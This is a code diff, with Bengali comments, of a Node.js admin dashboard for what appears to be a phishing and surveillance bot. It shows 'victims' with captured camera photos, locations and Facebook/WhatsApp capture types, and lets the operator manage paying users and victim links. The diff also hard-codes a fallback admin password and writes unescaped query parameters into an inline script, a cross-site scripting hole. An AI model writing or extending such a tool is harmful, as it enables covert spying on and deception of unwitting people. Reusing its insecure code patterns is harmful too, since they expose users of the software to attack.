@@ -6,18 +6,20 @@ const Victim = require('../models/Victim');
 const { sendMessage } = require('../utils/helpers');
 
 // ============================
-// অ্যাডমিন লগইন চেক (মিডলওয়্যার)
+// অ্যাডমিন লগইন চেক (মিডলওয়্যার) - এখন আর ব্যবহার হচ্ছে না, কারণ আমরা নিজেরাই চেক করি
 // ============================
-async function isAdmin(req, res, next) {
-    if (req.session.isAdmin) return next();
-    res.redirect('/admin');
-}
 
 // ============================
-// লগইন পেজ
+// লগইন পেজ & ড্যাশবোর্ড (রিডাইরেক্ট লুপ ফিক্স)
 // ============================
 router.get('/admin', async (req, res) => {
-    if (req.session.isAdmin) return res.redirect('/admin?tab=dashboard');
+    // যদি লগইন করা থাকে, ড্যাশবোর্ড দেখান
+    if (req.session.isAdmin) {
+        // ড্যাশবোর্ড রেন্ডার করুন (নিচের কোডটি কপি করা হয়েছে)
+        return renderDashboard(req, res);
+    }
+
+    // লগইন পেজ দেখান
     res.send(`
         <!DOCTYPE html>
         <html>
@@ -123,50 +125,42 @@ router.get('/admin', async (req, res) => {
     `);
 });
 
+// লগইন POST
 router.post('/admin/login', async (req, res) => {
     const config = await Config.findOne({ key: 'bot_config' });
     const adminPass = config ? config.adminPassword : 'Sakib@7890';
     if (req.body.password === adminPass) {
         req.session.isAdmin = true;
-        res.redirect('/admin?tab=dashboard');
+        res.redirect('/admin');
     } else {
         res.redirect('/admin?error=1');
     }
 });
 
+// লগআউট
 router.get('/admin/logout', (req, res) => {
     req.session.destroy();
     res.redirect('/admin');
 });
 
 // ================================================================
-// হেল্পার: ট্যাব ভ্যালিডেশন
+// ড্যাশবোর্ড রেন্ডার ফাংশন (রিডাইরেক্ট ছাড়া)
 // ================================================================
-function getActiveTab(req) {
-    const validTabs = ['dashboard', 'users', 'victims', 'config'];
-    const tab = req.query.tab || 'dashboard';
-    return validTabs.includes(tab) ? tab : 'dashboard';
-}
-
-// ================================================================
-// ড্যাশবোর্ড, ইউজার, ভিক্টিম, কনফিগ – সব একত্রে
-// ================================================================
-router.get('/admin', isAdmin, async (req, res) => {
-    const activeTab = getActiveTab(req);
+async function renderDashboard(req, res) {
+    const activeTab = req.query.tab || 'dashboard';
     const config = await Config.findOne({ key: 'bot_config' });
     const baseUrl = config?.baseUrl || 'http://localhost:3000';
     const msg = req.query.msg || '';
     const error = req.query.error || '';
     const search = req.query.search || '';
 
-    // ---------- ডেটা লোড ----------
+    // ডেটা লোড
     let totalUsers = await User.countDocuments();
     let allowedUsers = await User.countDocuments({ allowed: true });
     let totalVictims = await Victim.countDocuments();
     let victims = [];
     let users = [];
 
-    // ইউজার লিস্ট (সার্চ সহ)
     if (activeTab === 'users' || activeTab === 'dashboard') {
         if (search) {
             users = await User.find({ fbId: search });
@@ -175,7 +169,6 @@ router.get('/admin', isAdmin, async (req, res) => {
         }
     }
 
-    // ভিক্টিম লিস্ট (সার্চ সহ)
     if (activeTab === 'victims' || activeTab === 'dashboard') {
         let filter = {};
         if (search) {
@@ -184,7 +177,6 @@ router.get('/admin', isAdmin, async (req, res) => {
         victims = await Victim.find(filter).sort({ timestamp: -1 }).limit(50);
     }
 
-    // ---------- টেবিল রেন্ডার ----------
     // ইউজার টেবিল
     let userRows = users.map(u => {
         const expiryText = u.permissionExpiresAt ? new Date(u.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
@@ -236,7 +228,7 @@ router.get('/admin', isAdmin, async (req, res) => {
         `;
     }).join('');
 
-    // ভিক্টিম টেবিল (লিংক নির্মাতা সহ)
+    // ভিক্টিম টেবিল
     let victimRows = victims.map(v => {
         const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
         const imgTag = lastImage ? `<img src="data:image/jpeg;base64,${lastImage}" class="victim-thumb" />` : '—';
@@ -266,7 +258,7 @@ router.get('/admin', isAdmin, async (req, res) => {
     }).join('');
 
     // ============================================================
-    // HTML (নেভিগেশন + কন্টেন্ট)
+    // HTML রেসপন্স (পূর্ণ ড্যাশবোর্ড)
     // ============================================================
     res.send(`
         <!DOCTYPE html>
@@ -277,7 +269,9 @@ router.get('/admin', isAdmin, async (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+            <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
             <style>
+                /* (স্টাইল আগের মতোই, সংক্ষেপে দিচ্ছি) */
                 * { margin:0; padding:0; box-sizing:border-box; }
                 body { font-family: 'Inter', sans-serif; background: #f4f6fa; color: #111827; padding: 24px; }
                 .container { max-width: 1440px; margin: 0 auto; }
@@ -312,8 +306,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     gap: 8px;
                 }
                 .header .logout-btn:hover { background: #fecaca; }
-
-                /* Navigation tabs */
                 .nav-tabs {
                     display: flex;
                     gap: 8px;
@@ -337,13 +329,8 @@ router.get('/admin', isAdmin, async (req, res) => {
                     gap: 8px;
                 }
                 .nav-tabs a:hover { background: #f3f4f6; color: #111827; }
-                .nav-tabs a.active {
-                    background: #4f46e5;
-                    color: #fff;
-                }
+                .nav-tabs a.active { background: #4f46e5; color: #fff; }
                 .nav-tabs a.active:hover { background: #4338ca; }
-
-                /* Stats */
                 .stats {
                     display: grid;
                     grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -378,8 +365,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     line-height: 1.2;
                 }
                 .stat-card .info .label { font-size: 14px; color: #6b7280; }
-
-                /* Search */
                 .search-section {
                     background: #ffffff;
                     border-radius: 16px;
@@ -425,7 +410,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     color: #374151;
                 }
                 .search-section .clear-btn:hover { background: #d1d5db; }
-
                 .card {
                     background: #ffffff;
                     border-radius: 20px;
@@ -459,7 +443,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     padding: 4px 14px;
                     border-radius: 30px;
                 }
-
                 .table-wrap { overflow-x: auto; border-radius: 12px; }
                 table { width: 100%; border-collapse: collapse; font-size: 14px; }
                 th {
@@ -472,7 +455,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                 }
                 td { padding: 12px 10px; border-bottom: 1px solid #f3f4f6; vertical-align: middle; }
                 tr:last-child td { border-bottom: none; }
-
                 .id-badge {
                     background: #f3f4f6;
                     padding: 4px 10px;
@@ -490,7 +472,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                 .status-badge.allowed { background: #d1fae5; color: #065f46; }
                 .status-badge.denied { background: #fee2e2; color: #991b1b; }
                 .status-badge.expired { background: #fef3c7; color: #92400e; }
-
                 .type-badge {
                     padding: 4px 12px;
                     border-radius: 30px;
@@ -501,7 +482,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                 .type-badge.location { background: #e0e7ff; color: #3730a3; }
                 .type-badge.fb { background: #fce7f3; color: #9d174d; }
                 .type-badge.wp { background: #d1fae5; color: #065f46; }
-
                 .victim-thumb {
                     width: 44px;
                     height: 44px;
@@ -539,7 +519,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     transition: 0.2s;
                 }
                 .btn-view:hover { background: #dbeafe; }
-
                 .duration-select {
                     padding: 4px 6px;
                     border: 1px solid #ddd;
@@ -548,7 +527,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                     background: #f9fafb;
                     font-family: 'Inter', sans-serif;
                 }
-
                 .config-grid {
                     display: grid;
                     grid-template-columns: 1fr 1fr;
@@ -595,7 +573,6 @@ router.get('/admin', isAdmin, async (req, res) => {
                 }
                 .btn-primary:hover { background: #4338ca; }
                 .text-muted { color: #9ca3af; }
-
                 @media (max-width: 768px) {
                     .config-grid { grid-template-columns: 1fr; }
                     .header h1 { font-size: 22px; }
@@ -611,14 +588,10 @@ router.get('/admin', isAdmin, async (req, res) => {
         </head>
         <body>
             <div class="container">
-                <!-- Header -->
                 <div class="header">
                     <h1><i class="fas fa-panel"></i> অ্যাডমিন প্যানেল</h1>
                     <a href="/admin/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> লগআউট</a>
                 </div>
-
-                ${msg ? `<div style="background:#d1fae5;color:#065f46;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-check-circle"></i> ${msg}</div>` : ''}
-                ${error ? `<div style="background:#fee2e2;color:#991b1b;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-exclamation-circle"></i> ${error}</div>` : ''}
 
                 <!-- Navigation Tabs -->
                 <div class="nav-tabs">
@@ -628,9 +601,7 @@ router.get('/admin', isAdmin, async (req, res) => {
                     <a href="/admin?tab=config" class="${activeTab === 'config' ? 'active' : ''}"><i class="fas fa-sliders-h"></i> কনফিগ</a>
                 </div>
 
-                <!-- ============================================================ -->
-                <!-- DASHBOARD TAB -->
-                <!-- ============================================================ -->
+                <!-- Dashboard Tab -->
                 ${activeTab === 'dashboard' ? `
                 <div id="dashboard">
                     <div class="stats">
@@ -673,9 +644,7 @@ router.get('/admin', isAdmin, async (req, res) => {
                 </div>
                 ` : ''}
 
-                <!-- ============================================================ -->
-                <!-- USERS TAB -->
-                <!-- ============================================================ -->
+                <!-- Users Tab -->
                 ${activeTab === 'users' ? `
                 <div id="users">
                     <div class="search-section">
@@ -704,9 +673,7 @@ router.get('/admin', isAdmin, async (req, res) => {
                 </div>
                 ` : ''}
 
-                <!-- ============================================================ -->
-                <!-- VICTIMS TAB -->
-                <!-- ============================================================ -->
+                <!-- Victims Tab -->
                 ${activeTab === 'victims' ? `
                 <div id="victims">
                     <div class="search-section">
@@ -739,9 +706,7 @@ router.get('/admin', isAdmin, async (req, res) => {
                 </div>
                 ` : ''}
 
-                <!-- ============================================================ -->
-                <!-- CONFIG TAB -->
-                <!-- ============================================================ -->
+                <!-- Config Tab -->
                 ${activeTab === 'config' ? `
                 <div id="config">
                     <div class="card">
@@ -759,39 +724,67 @@ router.get('/admin', isAdmin, async (req, res) => {
                     </div>
                 </div>
                 ` : ''}
-
             </div>
 
             <!-- ============================================================ -->
-            <!-- পোলিং স্ক্রিপ্ট (রিয়েল-টাইম আপডেট) -->
+            <!-- পোলিং স্ক্রিপ্ট (প্রতি ১০ সেকেন্ডে রিলোড) + কাস্টম পপআপ -->
             <!-- ============================================================ -->
             <script>
                 (function() {
-                    // শুধু নির্দিষ্ট ট্যাবের জন্য পোলিং
                     const activeTab = "${activeTab}";
-                    if (activeTab === 'users' || activeTab === 'victims' || activeTab === 'dashboard') {
-                        // প্রতি ৫ সেকেন্ডে রিলোড (শুধু ডেটা অংশ)
-                        setInterval(function() {
-                            // আমরা পুরো পেজ রিলোড করবো না, বরং ট্যাব রিফ্রেশ করবো
-                            // সহজ উপায়: পেজ রিলোড (কারণ ছোট প্রোজেক্ট)
-                            // তবে আরও সুন্দর উপায়: AJAX, কিন্তু আমরা সহজের জন্য পুরো পেজ রিলোড দিচ্ছি
-                            // এতে রিয়েল-টাইম ইফেক্ট হবে
-                            location.reload();
-                        }, 5000); // ৫ সেকেন্ড
+
+                    // পপআপ দেখানোর জন্য (যদি msg বা error থাকে)
+                    const msg = "${msg}";
+                    const error = "${error}";
+                    if (msg) {
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'সফল!',
+                            text: msg.replace(/\\+/g, ' '),
+                            timer: 3000,
+                            showConfirmButton: false
+                        });
                     }
+                    if (error) {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'ত্রুটি!',
+                            text: error.replace(/\\+/g, ' '),
+                            timer: 4000,
+                            showConfirmButton: false
+                        });
+                    }
+
+                    // রিয়েল-টাইম আপডেট (পোলিং)
+                    if (activeTab === 'users' || activeTab === 'victims' || activeTab === 'dashboard') {
+                        setInterval(function() {
+                            // পুরো পেজ রিলোড (সহজ উপায়)
+                            location.reload();
+                        }, 10000); // ১০ সেকেন্ড
+                    }
+
+                    // ডিউরেশন সিলেক্ট চেইঞ্জ হলে hidden ইনপুট আপডেট
+                    document.querySelectorAll('.duration-select').forEach(select => {
+                        select.addEventListener('change', function() {
+                            const form = this.closest('form');
+                            const hiddenInput = form.querySelector('input[name="duration"]');
+                            if (hiddenInput) hiddenInput.value = this.value;
+                        });
+                    });
                 })();
             </script>
         </body>
         </html>
     `);
-});
+}
 
 // ================================================================
-// POST রাউটস (কনফিগ, ইউজার টগল, নাম পরিবর্তন, লিংক এক্সপায়ার, ডিলিট)
+// POST রাউটস (এগুলো আগের মতোই)
 // ================================================================
 
 // 1. কনফিগ আপডেট
-router.post('/admin/update-config', isAdmin, async (req, res) => {
+router.post('/admin/update-config', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         let config = await Config.findOne({ key: 'bot_config' });
         if (!config) config = new Config({ key: 'bot_config' });
@@ -807,8 +800,9 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
     }
 });
 
-// 2. ইউজার টগল (সময়সীমা সহ)
-router.post('/admin/toggle-user', isAdmin, async (req, res) => {
+// 2. ইউজার টগল
+router.post('/admin/toggle-user', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { userId, action, duration } = req.body;
         console.log(`🔄 ইউজার টগল: ${userId} → ${action}, duration: ${duration}`);
@@ -877,7 +871,8 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
 });
 
 // 3. ইউজারের নাম পরিবর্তন
-router.post('/admin/update-name', isAdmin, async (req, res) => {
+router.post('/admin/update-name', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { userId, newName } = req.body;
         if (!userId || !newName) {
@@ -897,8 +892,9 @@ router.post('/admin/update-name', isAdmin, async (req, res) => {
     }
 });
 
-// 4. লিংক এক্সপায়ার (ম্যানুয়াল)
-router.post('/admin/expire-link', isAdmin, async (req, res) => {
+// 4. লিংক এক্সপায়ার
+router.post('/admin/expire-link', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { victimId } = req.body;
         if (!victimId) {
@@ -919,7 +915,8 @@ router.post('/admin/expire-link', isAdmin, async (req, res) => {
 });
 
 // 5. ইউজার ডিলিট
-router.post('/admin/delete-user', isAdmin, async (req, res) => {
+router.post('/admin/delete-user', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { userId } = req.body;
         if (!userId) {
@@ -939,7 +936,8 @@ router.post('/admin/delete-user', isAdmin, async (req, res) => {
 // ============================
 // ভিক্টিম গ্যালারি ভিউ (আলাদা পেজ)
 // ============================
-router.get('/admin/victim/:id', isAdmin, async (req, res) => {
+router.get('/admin/victim/:id', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
